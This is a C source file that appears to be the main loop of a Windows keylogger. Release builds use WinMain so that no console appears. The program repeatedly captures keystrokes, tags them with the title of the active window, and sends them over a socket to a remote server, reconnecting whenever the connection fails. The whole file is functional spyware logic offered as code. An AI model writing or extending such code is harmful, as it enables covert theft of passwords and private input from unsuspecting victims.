#include "Definitions.h"
#include "Configs.h"
#include "Utils.h"
#include "Networking.h"
#include "System.h"
#include <stdio.h>

#ifdef DEBUG  
int main() 
#else 
int CALLBACK WinMain(_In_ HINSTANCE hInstance, _In_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLinde, _In_ int nCmdSHow)
#endif
{
	WelcomeMessage();

	SOCKET serverSock = connectToServer();
	bool isConnected = checkConnection(serverSock);
	int fromLastCheckSeconds = 0;
	char lastWindowName[256] = "";

	while (true) {

		const int delayMiliseconds = 200;
		Sleep(delayMiliseconds);
		if (fromLastCheckSeconds++ >= CONNECTION_CHECKING_INTERVAL * 1000 / delayMiliseconds) {
			isConnected = checkConnection(serverSock);
			fromLastCheckSeconds = 0;
		}

		if (!isConnected) {
			// Connecting To Server Again
			serverSock = NULL;
			while (!isConnected) {
				log(LOG_LINE);
				log("Trying again in next seconds...");
				Sleep(CONECTING_RETRY_DELAY * 1000);
				serverSock = connectToServer();
				isConnected = checkConnection(serverSock);
			}
			log("Connected.");
		}


		int CapturedCharacter = CaptureKeyboard();

		if (CapturedCharacter != NULL) {
			char message[1024] = "";

			char wndName[512];
			GetCurrentWindowName(wndName);

			if (strcmp(wndName, lastWindowName) != 0) {
				strcat(message, "\n----------------------------------------------------------------------------------------------\n");
				strcat(message, "Window Title : ");
				strcat(message, wndName);
				strcat(message, "\n");

				strcpy(lastWindowName, wndName); // set the last window name
			}

			char pressed_key[32] = {0};
			TranslateVK(CapturedCharacter, pressed_key);
			
			strcat(message, pressed_key);
			
			bool succeeded = sendMessage(serverSock, message);
			if (!succeeded) {
				log("Disconnected while sending a message!");
				isConnected = false;
				closesocket(serverSock);
				WSACleanup();
			}
		}

	}		
	return 0;
}